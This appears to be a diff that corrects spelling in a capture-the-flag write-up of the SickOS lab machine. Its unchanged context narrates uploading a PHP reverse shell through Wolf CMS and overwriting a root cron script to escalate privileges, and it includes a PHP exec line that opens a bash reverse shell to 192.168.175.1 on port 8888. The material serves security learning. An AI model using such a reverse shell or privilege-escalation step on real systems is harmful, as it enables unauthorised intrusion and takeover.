@@ -12,7 +12,7 @@ Output gave me information that VM runs http proxy. I configured Firefox to use 
 
 ![]({{site.baseurl}}/images/sickos2.png)
 
-I succeed and noticed some simple website. I tried robots.txt and found that there is Wolf CMS run under /wolfcms
+I succeeded and noticed a simple website. I tried robots.txt and found out that there is Wolf CMS run under /wolfcms
 
 ![]({{site.baseurl}}/images/sickos3.png)
 
@@ -27,7 +27,7 @@ From this place I was able to upload reverse shell and connect to VM.
 	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/8888 0>&1'");
 	?>
 
-After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunatelly I had permission to overwrite this file.
+After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunately I had permission to overwrite this file.
 
 ![]({{site.baseurl}}/images/sickos5.png)
 
